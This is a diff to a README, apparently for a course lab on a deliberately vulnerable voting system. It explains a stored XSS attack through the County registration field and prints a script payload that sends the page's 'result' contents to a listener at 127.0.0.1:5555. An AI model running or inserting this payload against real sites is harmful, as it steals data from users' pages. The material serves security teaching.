@@ -196,7 +196,7 @@ The following are the malicious contents we added (you can check **"/etovucca/"*
 Like what is shown in the above screenshot, you can launch XSS attack by writing **\<script>** contents into the **County** 
 field when registering. The input code example is the following:
 
-      \<script>document.write("<img src=http://127.0.0.1:5555?c="+escape(document.getElementById("result").innerHTML)+">");\</script>
+      <script>document.write("<img src=http://127.0.0.1:5555?c="+escape(document.getElementById("result").innerHTML)+">");</script>
 
 ![31f1fc1b4fd8829b4a2423b2a839787](https://user-images.githubusercontent.com/78676028/141211870-fa447c52-fe9e-492c-ae2c-e02b537ff214.png)
 
